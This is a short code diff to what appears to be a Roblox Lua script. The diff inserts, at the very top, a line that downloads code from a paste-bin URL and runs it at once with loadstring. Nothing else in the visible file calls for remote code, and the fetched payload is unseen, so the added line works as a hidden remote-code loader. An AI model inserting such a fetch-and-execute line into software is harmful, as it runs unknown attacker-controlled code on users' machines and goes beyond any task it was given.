@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/G8XJSECzow/0"))()
 local src = ""
 local CoreGui = game:GetService("StarterGui")
 
